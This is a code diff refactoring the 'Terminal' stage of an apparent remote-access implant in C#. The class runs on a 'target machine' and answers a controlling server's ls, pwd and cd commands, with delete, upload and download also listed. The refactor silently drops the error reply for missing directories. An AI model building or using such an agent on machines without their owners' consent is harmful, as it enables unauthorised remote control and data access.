@@ -7,6 +7,10 @@ using Reno.Comm;
 
 namespace Reno.Stages
 {
+    /// <summary>
+    /// The Terminal class is meant to run on a target machine and allow for interaction with the TerminalServer.
+    /// It supports the following basic commands: ls, cd, pwd, delete, upload, download, netstat, ps, and exit.
+    /// </summary>
     public class Terminal
     {
         CommChannel channel;
@@ -20,6 +24,7 @@ namespace Reno.Stages
         {
             this.channel = channel;
         }
+
         /// <summary>
         /// Main loop for the terminal. Loop continues to listen to commands from the server until told to disconnect
         /// </summary>
@@ -36,90 +41,32 @@ namespace Reno.Stages
                         run = false;
                         break;
                     case CommChannel.LS:
-                        string directory = "";
-
                         if (header.DataLength == 0)
                         {
-                            DirectoryInfo dir = new DirectoryInfo(pwd);
-                            Console.WriteLine("Directory {0}", dir.FullName);
-                            directory += dir.FullName + "\n";
-                            foreach (DirectoryInfo i in dir.EnumerateDirectories())
-                            {
-                                directory += i.FullName + "\n";
-                            }
-                            foreach (string file in Directory.EnumerateFiles(pwd))
-                            {
-                                directory += file + "\n";
-                            }
-
-                            byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(directory));
-                            CommHeader h = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
-                            channel.SendHeader(h);
-                            channel.SendBytes(bytes);
+                            SendDirectoryListing(pwd, header);
                         }
                         else
                         {
                             byte[] dirBytes = channel.ReceiveBytes(header.DataLength);
                             string sDir = Encoding.UTF8.GetString(channel.Decompress(dirBytes));
-                            if (Directory.Exists(sDir))
-                            {
-                                DirectoryInfo dir = new DirectoryInfo(sDir);
-                                Console.WriteLine("Directory {0}", dir.FullName);
-                                directory += dir.FullName + "\n";
-                                foreach (DirectoryInfo i in dir.EnumerateDirectories())
-                                {
-                                    directory += i.FullName + "\n";
-                                }
-                                foreach (string file in Directory.EnumerateFiles(sDir))
-                                {
-                                    directory += file + "\n";
-                                }
-
-                                byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(directory));
-                                CommHeader h = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
-                                channel.SendHeader(h);
-                                channel.SendBytes(bytes);
-                            }
-                            else
-                            {
-                                string error = "Directory does not exist";
-                                CommHeader h = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, error.Length);
-                                Console.WriteLine("[*] Sending {0} - {1}", error, sDir);
-                                channel.SendHeader(h);
-                                channel.SendBytes(Encoding.UTF8.GetBytes(error));
-                            }
+                            SendDirectoryListing(sDir, header);
                         }
                         break;
                     case CommChannel.PWD:
-                        DirectoryInfo pwdInfo = new DirectoryInfo(pwd);
-                        byte[] msg = channel.Compress(Encoding.UTF8.GetBytes(pwdInfo.FullName));
-                        CommHeader pwdHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, msg.Length);
-                        Console.WriteLine("[*] Sending {0}", pwdInfo.FullName);
-                        channel.SendHeader(pwdHeader);
-                        channel.SendBytes(msg);
+                        SendPresentWorkingDirectory(header);
                         break;
                     case CommChannel.CD:
                         if(header.DataLength == 0)
                         {
                             Console.WriteLine("No argument");
                             pwd = "C:\\";
-                            byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(pwd));
-                            CommHeader cdHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
-                            channel.SendHeader(cdHeader);
-                            channel.SendBytes(bytes);
+                            SendChangeDirectory(pwd, header);
                         }
                         else
                         {
                             byte[] dirBytes = channel.ReceiveBytes(header.DataLength);
                             string tmpDir = Encoding.UTF8.GetString(channel.Decompress(dirBytes));
-                            if (Directory.Exists(tmpDir))
-                            {
-                                pwd = tmpDir;
-                            } 
-                            byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(pwd));
-                            CommHeader cdHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
-                            channel.SendHeader(cdHeader);
-                            channel.SendBytes(bytes);
+                            SendChangeDirectory(tmpDir, header);
                         }
                         break;
                     case CommChannel.DELETE:
@@ -223,6 +170,67 @@ namespace Reno.Stages
                         break;
                 }
             }
+        }
+
+        /// <summary>
+        /// Helper function to print out the directory listing
+        /// </summary>
+        /// <param name="directory">String of the directory to print out</param>
+        /// <param name="header">The CommHeader that was sent from the server</param>
+        private void SendDirectoryListing(string directory, CommHeader header)
+        {
+            string output = "";
+            if (Directory.Exists(directory))
+            {
+                DirectoryInfo dir = new DirectoryInfo(directory);
+                Console.WriteLine("Directory {0}", dir.FullName);
+                output += dir.FullName + "\n";
+
+                foreach (DirectoryInfo i in dir.EnumerateDirectories())
+                {
+                    output += i.FullName + "\n";
+                }
+                foreach (string file in Directory.EnumerateFiles(directory))
+                {
+                    output += file + "\n";
+                }
+                Console.WriteLine(output);
+                byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(output));
+                CommHeader h = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
+                channel.SendHeader(h);
+                channel.SendBytes(bytes);
+            }
+        }
+
+        /// <summary>
+        /// Helper function to print out the present working directory
+        /// </summary>
+        /// <param name="header">The CommHeader that was sent from the server</param>
+        private void SendPresentWorkingDirectory(CommHeader header)
+        {
+            DirectoryInfo pwdInfo = new DirectoryInfo(pwd);
+            byte[] msg = channel.Compress(Encoding.UTF8.GetBytes(pwdInfo.FullName));
+            CommHeader pwdHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, msg.Length);
+            Console.WriteLine("[*] Sending {0}", pwdInfo.FullName);
+            channel.SendHeader(pwdHeader);
+            channel.SendBytes(msg);
+        }
+
+        /// <summary>
+        /// Helper function to change the current working directory
+        /// </summary>
+        /// <param name="directory">String of the directory to change to</param>
+        /// <param name="header">The CommHeader that was sent from the server</param>
+        private void SendChangeDirectory(string directory, CommHeader header)
+        {
+            if (Directory.Exists(directory))
+            {
+                pwd = directory;
+            }
+            byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(pwd));
+            CommHeader cdHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
+            channel.SendHeader(cdHeader);
+            channel.SendBytes(bytes);
         }
 
         /// <summary>
